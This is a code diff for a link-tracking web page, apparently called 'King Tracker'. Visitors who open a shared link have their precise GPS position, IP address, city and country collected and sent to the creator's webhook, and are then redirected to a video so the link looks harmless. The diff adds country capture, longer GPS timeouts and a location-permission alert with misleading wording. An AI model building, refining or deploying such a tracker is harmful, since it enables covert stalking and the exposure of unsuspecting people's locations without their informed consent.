@@ -348,7 +348,7 @@
         // Aapko apni location details receive karne ke liye ek 'Webhook' ya API ki zarurat hogi.
         // Aap 'https://webhook.site' se ek URL le kar yahan paste kar sakte hain.
         // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
-        const WEBHOOK_URL = "https://webhook.site/8389366e-c68e-4a64-9602-0402120e3609"; // Yahan apna Webhook URL daalein!
+        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein!
 
         // --- UI Control Functions ---
         function showSection(id, btn) {
@@ -439,8 +439,8 @@
                         ip: 'Unknown', city: 'Unknown', lat: null, lon: null
                     };
 
-                    const finalRedirect = () => {
-                        setTimeout(() => { window.location.href = targetUrl; }, 1000);
+                    const finalRedirect = (delay = 2500) => { // Default delay 2.5 seconds
+                        setTimeout(() => { window.location.href = targetUrl; }, delay);
                     };
 
                     const collectAndSend = (geoData) => {
@@ -448,37 +448,51 @@
                         fetch('https://ipapi.co/json/')
                             .then(res => res.json())
                             .then(ipData => {
+                                console.log("IPAPI.co data:", ipData);
                                 updateAndFinish(ipData, geoData);
                             })
-                            .catch(() => {
+                            .catch(ipapiErr => {
+                                console.error("IPAPI.co fetch error:", ipapiErr);
                                 // Fallback to IP Provider 2 (ipwho.is)
                                 fetch('https://ipwho.is/')
                                     .then(res => res.json())
                                     .then(ipData => {
+                                        console.log("IPWHO.is data:", ipData);
                                         updateAndFinish({
                                             ip: ipData.ip,
                                             city: ipData.city,
+                                            country_name: ipData.country, // ipwho.is provides 'country'
                                             latitude: ipData.latitude,
                                             longitude: ipData.longitude
                                         }, geoData);
                                     })
-                                    .catch(() => updateAndFinish(null, geoData));
+                                    .catch(ipwhoErr => {
+                                        console.error("IPWHO.is fetch error:", ipwhoErr);
+                                        updateAndFinish(null, geoData); // No IP data, proceed with geoData or null
+                                    });
                             });
                     };
 
                     const updateAndFinish = (ipData, geoData) => {
                         if (ipData) {
-                            visitorData.ip = ipData.ip || visitorData.ip;
-                            visitorData.city = ipData.city || visitorData.city;
-                            visitorData.lat = geoData ? geoData.lat : ipData.latitude;
-                            visitorData.lon = geoData ? geoData.lon : ipData.longitude;
+                            visitorData.ip = ipData.ip || 'Not available';
+                            visitorData.city = ipData.city || 'Not available';
+                            visitorData.country_name = ipData.country_name || ipData.country || 'Not available'; // Handle both ipapi.co and ipwho.is
+                            visitorData.lat = (geoData && geoData.lat) ? geoData.lat : (ipData.latitude || null);
+                            visitorData.lon = (geoData && geoData.lon) ? geoData.lon : (ipData.longitude || null);
                         } else if (geoData) {
                             visitorData.lat = geoData.lat;
                             visitorData.lon = geoData.lon;
+                            visitorData.ip = 'Not available (GPS only)';
+                            visitorData.city = 'Not available (GPS only)';
+                            visitorData.country_name = 'Not available (GPS only)';
                         }
 
                         saveLogLocally(visitorData);
+                        console.log("Final Visitor Data to send:", visitorData);
+
                         if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
+                            console.log("Sending data to Webhook:", WEBHOOK_URL);
                             fetch(WEBHOOK_URL, {
                                 method: 'POST',
                                 mode: 'no-cors',
@@ -491,17 +505,20 @@
 
                     // Try Precise GPS first
                     if (navigator.geolocation) {
+                        alert("King Tracker aapki location access karna chahta hai taaki aapko behtar tracking data mil sake. Kripya 'Allow' karein.");
+                        console.log("Requesting Geolocation...");
                         navigator.geolocation.getCurrentPosition(
                             (pos) => collectAndSend({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                            () => collectAndSend(null),
-                            { timeout: 8000, enableHighAccuracy: true }
+                            (err) => { console.warn("Geolocation denied or error:", err); collectAndSend(null); },
+                            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 } // Increased timeout, force fresh data
                         );
                     } else {
+                        console.warn("Geolocation not supported by browser or not available.");
                         collectAndSend(null);
                     }
 
                     // Emergency fallback redirect
-                    setTimeout(() => { if (window.location.href !== targetUrl) finalRedirect(); }, 8000);
+                    setTimeout(() => { if (window.location.href !== targetUrl) finalRedirect(0); }, 10000); // 10 seconds fallback
 
                 } catch (e) {
                     console.error("Invalid data parameter");
@@ -527,7 +544,7 @@
                 const row = `<tr>
                     <td>${log.link_label}</td>
                     <td>${log.ip}</td>
-                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'Location data missing\')'}" style="text-decoration: underline; color: var(--primary);">${log.city || 'Unknown'}</td>
+                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'Location data missing\')'}" style="text-decoration: underline; color: var(--primary);">${log.city || 'Unknown'} (${log.country_name || 'N/A'})</td>
                     <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
                     <td><a href="${log.redirect_url}" target="_blank" class="watch-btn">Watch Video</a></td>
                 </tr>`;
